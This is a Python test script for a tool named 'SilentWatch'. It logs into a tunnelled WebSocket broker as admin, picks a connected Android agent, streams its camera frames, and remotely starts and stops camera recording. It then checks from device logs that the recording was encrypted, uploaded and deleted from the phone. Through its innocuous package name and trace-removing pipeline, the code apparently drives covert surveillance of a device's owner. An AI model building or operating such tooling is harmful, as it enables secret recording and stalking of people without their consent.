#!/usr/bin/env python3
"""
SilentWatch — Recording Pipeline Tester
========================================
1. Connects to the WebSocket broker as admin
2. Lists online agents and selects one
3. Sends  start_recording  command
4. Simultaneously tails ADB logcat and prints only our app's lines
   (BatteryStats / Oplus noise is stripped)
5. After --duration seconds sends  stop_recording
6. Waits for the device to finalize + encrypt, then prints a verdict

Usage
-----
  python test_recording.py --url wss://xyz.trycloudflare.com
  python test_recording.py --url wss://xyz.trycloudflare.com --duration 20
  python test_recording.py --url wss://xyz.trycloudflare.com --agent android_device_RMX3563
"""

import argparse
import asyncio
import io
import json
import subprocess
import sys
import threading
import time
from datetime import datetime
from typing import Optional

# Force UTF-8 on Windows — cp1252 can't encode box-drawing / tick chars
if hasattr(sys.stdout, 'buffer'):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'buffer'):
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ── Auto-install deps ─────────────────────────────────────────────────────────
def _ensure(mod: str, pkg: str):
    try:
        __import__(mod)
    except ImportError:
        print(f"[setup] Installing {pkg}…", flush=True)
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

_ensure("websockets", "websockets")
import websockets  # noqa: E402

# ── ANSI colours (disabled automatically if stdout is not a tty) ──────────────
_tty = sys.stdout.isatty()
def _c(code: str, text: str) -> str:
    return f"{code}{text}\033[0m" if _tty else text

GRN  = lambda t: _c("\033[92m", t)
RED  = lambda t: _c("\033[91m", t)
YLW  = lambda t: _c("\033[93m", t)
CYN  = lambda t: _c("\033[96m", t)
BOLD = lambda t: _c("\033[1m",  t)

# ── Shared state ──────────────────────────────────────────────────────────────
APP_PKG = "com.example.helloapp"

KEEP_TAGS  = [
    "AgentWSManager", "CameraStreamService", "AppLaunchService",
    "Pipeline", "Encrypt", "Compress", "Recording", "R2Uploader",
]
NOISE_TAGS = [
    "BatteryStats", "oplus", "Oplus", "OplusAtlas", "OplusStatistics",
    "ActivityThread", "CompatibilityInfo",
]

# Shared log lines captured from logcat, printed in verdict section
captured_device_lines: list = []
capture_lock = threading.Lock()

# ── Helpers ───────────────────────────────────────────────────────────────────
def now() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def p_broker(msg: str):
    print(f"{CYN(f'[{now()}] [BROKER]')} {msg}", flush=True)

def p_device(msg: str):
    print(f"{GRN(f'[{now()}] [DEVICE]')} {msg}", flush=True)

def p_info(msg: str):
    print(f"[{now()}] [INFO  ] {msg}", flush=True)

def p_err(msg: str):
    print(f"{RED(f'[{now()}] [ERROR ]')} {msg}", flush=True)

def p_warn(msg: str):
    print(f"{YLW(f'[{now()}] [WARN  ]')} {msg}", flush=True)

# ── ADB helpers ───────────────────────────────────────────────────────────────
def adb(*args, device_id: Optional[str] = None, timeout: int = 6) -> str:
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""

def detect_device() -> Optional[str]:
    out = adb("devices")
    for line in out.splitlines():
        if "\tdevice" in line:
            return line.split("\t")[0]
    return None

def check_recording_file(device_id: Optional[str]) -> bool:
    """Return True if any recording file exists in the app's internal storage."""
    out = adb("shell", "run-as", APP_PKG, "ls", "files/recordings/",
              device_id=device_id, timeout=8)
    return bool(out and "No such file" not in out)

# ── Logcat tail ───────────────────────────────────────────────────────────────
def tail_logcat(stop: threading.Event, device_id: Optional[str]):
    """
    Background thread: runs `adb logcat` and prints lines relevant to our app.
    Filters out high-volume system noise so the recording pipeline is readable.
    """
    adb("logcat", "-c", device_id=device_id)  # clear buffer
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += ["logcat", "-v", "time"]

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            encoding='utf-8', errors='replace', bufsize=1
        )
    except FileNotFoundError:
        p_warn("adb not found — device log disabled")
        return

    while not stop.is_set():
        line = proc.stdout.readline()
        if not line:
            break
        line = line.rstrip()
        if not line:
            continue

        # Drop noise
        if any(n in line for n in NOISE_TAGS):
            continue

        # Keep only our app's lines
        relevant = (APP_PKG in line) or any(t in line for t in KEEP_TAGS)
        if not relevant:
            continue

        # Colour by log level (field at position ~24 in `-v time` format)
        lvl = line[27:28] if len(line) > 28 else " "
        if lvl == "E":
            formatted = RED(f"  {line}")
        elif lvl == "W":
            formatted = YLW(f"  {line}")
        elif lvl == "I":
            formatted = GRN(f"  {line}")
        else:
            formatted = f"  {line}"

        print(formatted, flush=True)
        with capture_lock:
            captured_device_lines.append(line)

    proc.terminate()

# ── WebSocket test logic ──────────────────────────────────────────────────────
async def run(url: str, target_agent: Optional[str], duration: int) -> bool:
    p_info(f"Connecting → {url}")

    try:
        async with websockets.connect(
            url,
            ping_interval=20, ping_timeout=30,
            open_timeout=15, max_size=10 * 1024 * 1024,
        ) as ws:

            # ── Register as admin ─────────────────────────────────────────────
            await ws.send(json.dumps({"role": "admin"}))
            p_broker("Registered as admin")

            # ── Get agent list ────────────────────────────────────────────────
            agents = []
            p_info("Waiting for agent list (up to 8s)…")
            deadline = asyncio.get_event_loop().time() + 8
            while asyncio.get_event_loop().time() < deadline:
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(raw, bytes):
                        continue
                    msg = json.loads(raw)
                    if msg.get("type") == "agent_list":
                        agents = msg.get("agents", [])
                        break
                except (asyncio.TimeoutError, Exception):
                    break

            if not agents:
                p_err("No agents connected. Start the Android app and try again.")
                return False

            # ── Print agent list ──────────────────────────────────────────────
            print(f"\n{'─'*58}")
            print(f"  {BOLD('ONLINE AGENTS')}")
            print(f"{'─'*58}")
            for i, a in enumerate(agents, 1):
                aid = a.get("agent_id", "unknown")
                ts_  = a.get("connected_at") or "—"
                print(f"  [{i}]  {aid}   connected={ts_}")
            print(f"{'─'*58}\n")

            # ── Select agent ──────────────────────────────────────────────────
            if target_agent:
                sel = next((a["agent_id"] for a in agents
                            if a["agent_id"] == target_agent), None)
                if not sel:
                    p_warn(f"Agent '{target_agent}' not in list — using first")
                    sel = agents[0]["agent_id"]
            else:
                sel = agents[0]["agent_id"]

            p_info(f"Using agent: {BOLD(sel)}")

            # Watch the agent so we receive its camera frames
            await ws.send(json.dumps({"command": "watch_agent", "agent_id": sel}))
            try:
                raw = await asyncio.wait_for(ws.recv(), timeout=5)
                if not isinstance(raw, bytes):
                    msg = json.loads(raw)
                    if msg.get("type") == "watching":
                        p_broker(f"Confirmed watching: {msg.get('agent_id')}")
            except asyncio.TimeoutError:
                pass

            # ── SEND start_recording ──────────────────────────────────────────
            print(f"\n{'═'*58}")
            print(f"  {GRN(BOLD(f'▶  start_recording  →  {sel}'))}")
            print(f"{'═'*58}\n")

            cmd = json.dumps({"command": "start_recording", "agent_id": sel})
            await ws.send(cmd)
            p_broker(f"Sent → {cmd}")

            # ── Monitor for duration seconds ──────────────────────────────────
            p_info(f"Recording for {duration}s — device logs streaming above…")
            print(f"{'─'*58}")

            t0 = time.monotonic()
            frames_received = 0
            msgs_received   = 0

            while time.monotonic() - t0 < duration:
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=0.5)
                    if isinstance(raw, bytes):
                        frames_received += 1
                    else:
                        msgs_received += 1
                        msg = json.loads(raw)
                        p_broker(f"Received text: {json.dumps(msg)}")
                except asyncio.TimeoutError:
                    elapsed  = int(time.monotonic() - t0)
                    remaining = duration - elapsed
                    print(
                        f"\r  ⏱  {elapsed:>3}s / {duration}s  "
                        f"frames={frames_received}  msgs={msgs_received}  "
                        f"remaining={remaining}s   ",
                        end="", flush=True
                    )

            print(f"\r{' '*70}\r", flush=True)
            print(f"{'─'*58}\n")

            # ── SEND stop_recording ───────────────────────────────────────────
            print(f"{'═'*58}")
            print(f"  {RED(BOLD(f'■  stop_recording   →  {sel}'))}")
            print(f"{'═'*58}\n")

            cmd = json.dumps({"command": "stop_recording", "agent_id": sel})
            await ws.send(cmd)
            p_broker(f"Sent → {cmd}")

            # ── Wait for pipeline to finish ───────────────────────────────────
            p_info("Waiting 18s for device to finalise, encrypt, and delete files…")
            for i in range(18):
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=1)
                    if not isinstance(raw, bytes):
                        p_broker(f"Received: {raw}")
                except asyncio.TimeoutError:
                    print(f"\r  Finalising… {i+1}/18s  ", end="", flush=True)

            print()
            return True

    except websockets.exceptions.ConnectionClosed as e:
        p_err(f"Connection closed: {e}")
    except OSError as e:
        p_err(f"Cannot reach broker: {e}")
        p_err("Is the tunnel running?  python start_tunnel.py")
    except Exception as e:
        p_err(f"Unexpected: {e}")

    return False

# ── Verdict ───────────────────────────────────────────────────────────────────
def verdict(device_id: Optional[str]):
    with capture_lock:
        lines = list(captured_device_lines)

    has_cmd     = any("Received admin command: start_recording" in l for l in lines)
    has_intent  = any("ACTION_START_RECORDING" in l or "Action: " in l for l in lines)
    has_started = any("Recording started" in l for l in lines)
    has_done    = any("[Pipeline] DONE" in l for l in lines)
    has_enc     = any("Encrypted" in l or "Encrypting" in l for l in lines)
    has_err     = any((" E " in l and "helloapp" in l) for l in lines)
    file_exists = check_recording_file(device_id)

    print(f"\n{'═'*58}")
    print(f"  {BOLD('PIPELINE VERDICT')}")
    print(f"{'═'*58}")

    checks = [
        (has_cmd,     "Command received by agent WebSocket"),
        (has_intent,  "Intent dispatched to CameraStreamService"),
        (has_started, "Recording started (VideoCapture active)"),
        (has_enc,     "Encryption step ran"),
        (has_done,    "Pipeline completed (file deleted from device)"),
    ]

    all_ok = True
    for ok, label in checks:
        icon = GRN("✓") if ok else RED("✗")
        print(f"  {icon}  {label}")
        if not ok:
            all_ok = False

    if has_err:
        print(f"\n  {RED('⚠  Errors were logged — check device lines above')}")

    if file_exists:
        print(f"\n  {YLW('⚠  Recording file still on device (pipeline incomplete or in progress)')}")
    else:
        print(f"\n  {GRN('✓  No leftover files on device')}")

    print(f"\n{'─'*58}")
    if all_ok:
        print(f"  {GRN(BOLD('ALL CHECKS PASSED — recording pipeline is working'))}")
    else:
        print(f"  {RED(BOLD('SOME CHECKS FAILED — see ✗ items above'))}")
        # Diagnose
        if not has_cmd:
            print(f"\n  Likely cause: command was dropped by the broker.")
            print(f"  Fix: ensure 'start_recording' is in server.py whitelist")
            print(f"       (already fixed in latest code — restart server.py)")
        elif not has_started:
            print(f"\n  Command reached device but recording did not start.")
            print(f"  Check for bind errors in device logs above.")

    print(f"{'═'*58}\n")

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="SilentWatch recording pipeline tester with live device log monitoring"
    )
    parser.add_argument("--url",      required=True, help="Broker WebSocket URL  e.g. wss://xyz.trycloudflare.com")
    parser.add_argument("--agent",    default=None,  help="Target agent_id (default: first online agent)")
    parser.add_argument("--duration", type=int, default=15, help="Recording seconds before auto-stop (default: 15)")
    parser.add_argument("--device",   default=None,  help="ADB device serial (default: auto-detect)")
    args = parser.parse_args()

    # Normalise URL scheme
    url = args.url
    if url.startswith("https://"):
        url = "wss://" + url[8:]
    elif url.startswith("http://"):
        url = "ws://"  + url[7:]

    # Detect ADB device
    device_id = args.device or detect_device()
    if device_id:
        p_info(f"ADB device: {device_id}")
    else:
        p_warn("No ADB device detected — device logs disabled")

    print(f"\n{BOLD('═'*58)}")
    print(f"  {BOLD('SilentWatch — Recording Pipeline Tester')}")
    print(f"  Broker   : {url}")
    print(f"  Device   : {device_id or 'none'}")
    print(f"  Duration : {args.duration}s")
    print(f"{BOLD('═'*58)}\n")

    # Start logcat tail thread
    stop_evt = threading.Event()
    if device_id:
        t = threading.Thread(
            target=tail_logcat, args=(stop_evt, device_id),
            daemon=True, name="Logcat"
        )
        t.start()
        time.sleep(1.2)  # let logcat buffer clear and settle

    # Run test
    try:
        success = asyncio.run(run(url, args.agent, args.duration))
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
        success = False
    finally:
        time.sleep(2)      # capture final device logs
        stop_evt.set()

    # Print verdict
    verdict(device_id)

if __name__ == "__main__":
    main()
